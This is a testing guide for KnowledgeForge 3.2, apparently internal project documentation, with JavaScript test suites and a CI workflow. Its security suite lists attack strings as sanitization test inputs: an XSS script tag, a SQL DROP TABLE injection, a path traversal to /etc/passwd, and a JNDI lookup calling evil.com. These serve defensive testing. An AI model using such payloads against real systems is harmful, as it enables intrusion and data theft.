# 04\_TestScenarios

## title: "Comprehensive Test Scenarios for KnowledgeForge 3.2"

module: "04\_Testing" topics: \["testing", "validation", "quality assurance", "integration testing", "performance testing", "system verification"\] contexts: \["development", "deployment", "maintenance", "troubleshooting", "continuous integration"\] difficulty: "intermediate" related\_sections: \["00\_KB3\_Core", "04\_TestScenarios\_GitIntegration", "01\_Core\_DataTransfer", "03\_Agents\_Catalog"\]

## Core Approach

This document provides comprehensive test scenarios for all KnowledgeForge 3.2 components, ensuring system reliability, performance, and integration quality. Tests cover individual components, integration points, data transfer capabilities, and the new Git Integration features.

## 🧪 Test Categories

### Unit Tests

- Individual component functionality  
- Agent response validation  
- Data compression algorithms  
- Utility functions

### Integration Tests

- Agent-to-agent communication  
- Workflow execution  
- Git operations  
- Data transfer pipelines

### System Tests

- End-to-end scenarios  
- Performance under load  
- Failure recovery  
- Resource utilization

### Acceptance Tests

- User workflow validation  
- Feature completeness  
- Performance benchmarks  
- Security validation

## 📋 Core System Tests

### Test Suite 1: System Health

```javascript
// tests/system-health.test.js
const assert = require('assert');
const { KnowledgeForgeClient } = require('../clients/knowledgeforge-client');

describe('System Health Tests', () => {
  let client;
  
  before(async () => {
    client = new KnowledgeForgeClient();
    await client.waitForReady();
  });
  
  it('should verify all core services are running', async () => {
    const health = await client.checkHealth();
    
    assert(health.n8n.status === 'healthy', 'N8N should be healthy');
    assert(health.redis.status === 'healthy', 'Redis should be healthy');
    assert(health.git.status === 'connected', 'Git should be connected');
    assert(health.agents.allHealthy === true, 'All agents should be healthy');
  });
  
  it('should verify webhook endpoints are accessible', async () => {
    const endpoints = [
      '/kf32/artifact/capture',
      '/kf32/agent/navigator',
      '/kf32/git/status',
      '/kf32/monitoring/dashboard'
    ];
    
    for (const endpoint of endpoints) {
      const response = await client.testEndpoint(endpoint);
      assert(response.accessible === true, `${endpoint} should be accessible`);
    }
  });
  
  it('should verify data transfer system is operational', async () => {
    const testData = { test: true, size: 'small' };
    const result = await client.transferData(testData);
    
    assert(result.success === true, 'Data transfer should succeed');
    assert(result.compressionRatio > 0, 'Should report compression ratio');
  });
});
```

### Test Suite 2: Agent Communication

```javascript
describe('Agent Communication Tests', () => {
  it('should route queries to correct agent', async () => {
    const query = {
      text: "Help me navigate KnowledgeForge",
      context: { needsRouting: true }
    };
    
    const response = await client.queryAgent('navigator', query);
    
    assert(response.agentId === 'navigator', 'Should route to Navigator');
    assert(response.response, 'Should provide navigation guidance');
  });
  
  it('should handle multi-agent coordination', async () => {
    const complexQuery = {
      text: "Build an agent and save it to git",
      requiresAgents: ['agent-builder', 'git-integration']
    };
    
    const response = await client.processComplexQuery(complexQuery);
    
    assert(response.agents.length >= 2, 'Should involve multiple agents');
    assert(response.artifacts.length > 0, 'Should generate artifacts');
    assert(response.gitCommit, 'Should commit to git');
  });
  
  it('should preserve context across agent interactions', async () => {
    const session = await client.startSession();
    
    // First interaction
    await client.queryWithSession(session.id, {
      agent: 'navigator',
      query: 'I want to build a data processing agent'
    });
    
    // Second interaction should have context
    const response = await client.queryWithSession(session.id, {
      agent: 'agent-builder',
      query: 'Start building'
    });
    
    assert(response.context.previousQuery, 'Should have previous context');
    assert(response.context.intent === 'data-processing-agent', 'Should preserve intent');
  });
});
```

### Test Suite 3: Data Transfer

```javascript
describe('Data Transfer Tests', () => {
  it('should handle small data efficiently', async () => {
    const smallData = { message: 'test', items: [1, 2, 3] };
    const start = Date.now();
    
    const result = await client.transferData(smallData);
    const duration = Date.now() - start;
    
    assert(duration < 100, 'Small data should transfer in <100ms');
    assert(!result.compressed, 'Small data should not be compressed');
  });
  
  it('should compress and chunk large data', async () => {
    const largeData = {
      content: 'x'.repeat(1048576), // 1MB
      metadata: { type: 'test' }
    };
    
    const result = await client.transferData(largeData);
    
    assert(result.compressed === true, 'Large data should be compressed');
    assert(result.chunks > 1, 'Large data should be chunked');
    assert(result.compressionRatio > 50, 'Should achieve >50% compression');
  });
  
  it('should handle streaming data', async () => {
    const stream = client.createDataStream();
    let receivedChunks = 0;
    
    stream.on('chunk', () => receivedChunks++);
    
    // Send data in chunks
    for (let i = 0; i < 10; i++) {
      stream.write({ chunk: i, data: 'x'.repeat(10000) });
    }
    
    await stream.end();
    
    assert(receivedChunks === 10, 'Should receive all chunks');
  });
});
```

### Test Suite 4: Workflow Execution

```javascript
describe('Workflow Execution Tests', () => {
  it('should execute artifact capture workflow', async () => {
    const artifact = {
      content: '# Test Artifact\n\nTest content',
      type: 'markdown',
      filename: 'test_artifact.md'
    };
    
    const result = await client.captureArtifact(artifact);
    
    assert(result.success === true, 'Capture should succeed');
    assert(result.workflowId, 'Should return workflow execution ID');
    assert(result.gitCommit, 'Should create git commit');
  });
  
  it('should handle workflow errors gracefully', async () => {
    const invalidArtifact = {
      content: null, // Invalid
      type: 'unknown'
    };
    
    const result = await client.captureArtifact(invalidArtifact);
    
    assert(result.success === false, 'Should fail gracefully');
    assert(result.error, 'Should provide error details');
    assert(result.retryable === true, 'Should indicate if retryable');
  });
  
  it('should batch related operations', async () => {
    const artifacts = [
      { content: '# Doc 1', type: 'markdown', filename: 'doc1.md' },
      { content: '# Doc 2', type: 'markdown', filename: 'doc2.md' },
      { content: '# Doc 3', type: 'markdown', filename: 'doc3.md' }
    ];
    
    const results = await client.captureArtifacts(artifacts);
    
    assert(results.batched === true, 'Should batch operations');
    assert(results.commits === 1, 'Should create single commit');
    assert(results.artifacts.length === 3, 'Should capture all artifacts');
  });
});
```

## 🚀 Performance Tests

### Load Testing

```javascript
// tests/performance/load-test.js
const autocannon = require('autocannon');

async function loadTest() {
  const instance = autocannon({
    url: process.env.N8N_WEBHOOK_BASE,
    connections: 10,
    pipelining: 1,
    duration: 30,
    requests: [
      {
        method: 'POST',
        path: '/kf32/artifact/capture',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': process.env.KF32_API_KEY
        },
        body: JSON.stringify({
          artifact: {
            content: 'Test content',
            type: 'text',
            filename: 'load_test.txt'
          }
        })
      }
    ]
  });
  
  autocannon.track(instance, { renderProgressBar: true });
  
  instance.on('done', (results) => {
    console.log('Load Test Results:');
    console.log(`- Requests/sec: ${results.requests.average}`);
    console.log(`- Latency (p95): ${results.latency.p95}ms`);
    console.log(`- Errors: ${results.errors}`);
    
    // Assert performance targets
    assert(results.requests.average > 100, 'Should handle >100 req/s');
    assert(results.latency.p95 < 1000, 'p95 latency should be <1s');
    assert(results.errors === 0, 'Should have no errors');
  });
}
```

### Memory Usage Test

```javascript
describe('Memory Usage Tests', () => {
  it('should not leak memory during large transfers', async () => {
    const memoryBefore = process.memoryUsage();
    
    // Transfer 100MB in 10MB chunks
    for (let i = 0; i < 10; i++) {
      const data = Buffer.alloc(10485760); // 10MB
      await client.transferData(data);
    }
    
    // Force garbage collection
    if (global.gc) global.gc();
    
    const memoryAfter = process.memoryUsage();
    const heapGrowth = memoryAfter.heapUsed - memoryBefore.heapUsed;
    
    assert(heapGrowth < 52428800, 'Heap growth should be <50MB');
  });
});
```

## 🔒 Security Tests

### Authentication Tests

```javascript
describe('Security Tests', () => {
  it('should reject requests without API key', async () => {
    const publicClient = new KnowledgeForgeClient({ apiKey: null });
    
    try {
      await publicClient.captureArtifact({ content: 'test' });
      assert.fail('Should reject unauthenticated request');
    } catch (error) {
      assert(error.status === 401, 'Should return 401 Unauthorized');
    }
  });
  
  it('should reject invalid API keys', async () => {
    const invalidClient = new KnowledgeForgeClient({ apiKey: 'invalid-key' });
    
    try {
      await invalidClient.queryAgent('navigator', { query: 'test' });
      assert.fail('Should reject invalid API key');
    } catch (error) {
      assert(error.status === 403, 'Should return 403 Forbidden');
    }
  });
  
  it('should sanitize user inputs', async () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE artifacts; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}'
    ];
    
    for (const input of maliciousInputs) {
      const result = await client.captureArtifact({
        content: input,
        filename: input
      });
      
      assert(result.sanitized === true, 'Should sanitize malicious input');
      assert(!result.filename.includes('..'), 'Should prevent path traversal');
    }
  });
});
```

## 🔄 Integration Test Scenarios

### Scenario 1: Complete Agent Building Flow

```javascript
describe('Agent Building Integration', () => {
  it('should complete full agent building cycle', async () => {
    const session = await client.startAgentBuildingSession({
      agentName: 'TestAgent',
      purpose: 'Integration testing'
    });
    
    // Planning phase
    const planning = await client.agentBuilderPhase(session.id, {
      phase: 'planning',
      requirements: {
        capabilities: ['data processing', 'validation'],
        integrations: ['git', 'webhooks']
      }
    });
    
    assert(planning.specifications, 'Should generate specifications');
    
    // Design phase
    const design = await client.agentBuilderPhase(session.id, {
      phase: 'design',
      architecture: planning.suggestedArchitecture
    });
    
    assert(design.systemPrompt, 'Should generate system prompt');
    
    // Implementation phase
    const implementation = await client.agentBuilderPhase(session.id, {
      phase: 'implementation'
    });
    
    assert(implementation.files.length > 0, 'Should generate files');
    assert(implementation.gitCommits.length > 0, 'Should auto-commit');
    
    // Validation phase
    const validation = await client.agentBuilderPhase(session.id, {
      phase: 'validation'
    });
    
    assert(validation.testsPass === true, 'All tests should pass');
    assert(validation.deploymentReady === true, 'Should be ready for deployment');
  });
});
```

### Scenario 2: Documentation Synchronization

```javascript
describe('Documentation Sync Integration', () => {
  it('should maintain documentation consistency', async () => {
    // Create new documentation
    const doc = await client.createDocument({
      title: 'Test Integration Guide',
      content: '# Test Guide\n\nSee details in 00_KB3_Core.md',
      references: ['00_KB3_Core.md', '03_Agents_Catalog.md']
    });
    
    // Trigger sync
    const syncResult = await client.triggerDocSync();
    
    assert(syncResult.referencesValid === true, 'References should be valid');
    assert(syncResult.indexUpdated === true, 'Index should be updated');
    assert(syncResult.navigationUpdated === true, 'Navigation should be updated');
    
    // Verify cross-references
    const validation = await client.validateDocumentation();
    
    assert(validation.brokenLinks.length === 0, 'Should have no broken links');
    assert(validation.orphanedDocs.length === 0, 'Should have no orphaned docs');
  });
});
```

## 🎯 Test Data Management

### Test Data Generator

```javascript
class TestDataGenerator {
  generateArtifact(type = 'random', size = 'medium') {
    const generators = {
      markdown: () => this.generateMarkdown(size),
      code: () => this.generateCode(size),
      workflow: () => this.generateWorkflow(size),
      config: () => this.generateConfig(size)
    };
    
    const artifactType = type === 'random' ? 
      Object.keys(generators)[Math.floor(Math.random() * 4)] : type;
    
    return {
      content: generators[artifactType](),
      type: artifactType,
      filename: `test_${Date.now()}.${this.getExtension(artifactType)}`,
      metadata: {
        generator: 'TestDataGenerator',
        size: size,
        timestamp: new Date().toISOString()
      }
    };
  }
  
  generateMarkdown(size) {
    const sizes = {
      small: 100,
      medium: 1000,
      large: 10000
    };
    
    const wordCount = sizes[size] || 1000;
    const words = ['lorem', 'ipsum', 'dolor', 'sit', 'amet'];
    
    let content = '# Test Document\n\n';
    for (let i = 0; i < wordCount; i++) {
      content += words[i % words.length] + ' ';
      if (i % 20 === 19) content += '\n';
      if (i % 100 === 99) content += '\n## Section ' + Math.floor(i / 100) + '\n\n';
    }
    
    return content;
  }
  
  generateCode(size) {
    const sizes = {
      small: 10,
      medium: 50,
      large: 200
    };
    
    const functionCount = sizes[size] || 50;
    let code = '// Test code file\n\n';
    
    for (let i = 0; i < functionCount; i++) {
      code += `
function testFunction${i}(param1, param2) {
  const result = param1 + param2;
  console.log('Result:', result);
  return result;
}
`;
    }
    
    return code;
  }
}
```

## 📊 Test Reporting

### Test Report Generator

```javascript
class TestReporter {
  constructor() {
    this.results = {
      passed: 0,
      failed: 0,
      skipped: 0,
      suites: []
    };
  }
  
  generateReport() {
    const report = {
      summary: {
        total: this.results.passed + this.results.failed + this.results.skipped,
        passed: this.results.passed,
        failed: this.results.failed,
        skipped: this.results.skipped,
        passRate: (this.results.passed / (this.results.passed + this.results.failed) * 100).toFixed(2) + '%'
      },
      details: this.results.suites,
      timestamp: new Date().toISOString(),
      environment: {
        node: process.version,
        platform: process.platform,
        knowledgeforge: process.env.KNOWLEDGEFORGE_VERSION
      }
    };
    
    return report;
  }
  
  exportHTML() {
    const report = this.generateReport();
    
    return `
<!DOCTYPE html>
<html>
<head>
  <title>KnowledgeForge Test Report</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    .summary { background: #f0f0f0; padding: 20px; border-radius: 5px; }
    .passed { color: #28a745; }
    .failed { color: #dc3545; }
    .skipped { color: #ffc107; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
  </style>
</head>
<body>
  <h1>KnowledgeForge 3.2 Test Report</h1>
  <div class="summary">
    <h2>Summary</h2>
    <p>Total Tests: ${report.summary.total}</p>
    <p class="passed">Passed: ${report.summary.passed}</p>
    <p class="failed">Failed: ${report.summary.failed}</p>
    <p class="skipped">Skipped: ${report.summary.skipped}</p>
    <p>Pass Rate: ${report.summary.passRate}</p>
  </div>
  
  <h2>Test Suites</h2>
  <table>
    <tr>
      <th>Suite</th>
      <th>Tests</th>
      <th>Passed</th>
      <th>Failed</th>
      <th>Duration</th>
    </tr>
    ${report.details.map(suite => `
    <tr>
      <td>${suite.name}</td>
      <td>${suite.total}</td>
      <td class="passed">${suite.passed}</td>
      <td class="failed">${suite.failed}</td>
      <td>${suite.duration}ms</td>
    </tr>
    `).join('')}
  </table>
  
  <p><small>Generated: ${report.timestamp}</small></p>
</body>
</html>
    `;
  }
}
```

## 🚦 Continuous Integration

### CI Pipeline Configuration

```
# .github/workflows/test.yml
name: KnowledgeForge Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * *' # Daily

jobs:
  test:
    runs-on: ubuntu-latest
    
    services:
      redis:
        image: redis:7-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'
    
    - name: Install dependencies
      run: npm ci
    
    - name: Run unit tests
      run: npm test -- --suite=unit
    
    - name: Run integration tests
      run: npm test -- --suite=integration
      env:
        N8N_WEBHOOK_BASE: ${{ secrets.TEST_N8N_URL }}
        KF32_API_KEY: ${{ secrets.TEST_API_KEY }}
    
    - name: Run performance tests
      run: npm test -- --suite=performance
    
    - name: Generate coverage report
      run: npm run coverage
    
    - name: Upload test results
      uses: actions/upload-artifact@v3
      with:
        name: test-results
        path: |
          coverage/
          test-results/
```

## Next Steps

1️⃣ **Run basic tests** → Verify core functionality 2️⃣ **Set up CI pipeline** → Automate testing 3️⃣ **Create custom tests** → Add domain-specific scenarios 4️⃣ **Monitor test metrics** → Track quality over time 5️⃣ **Expand coverage** → Aim for \>80% code coverage  
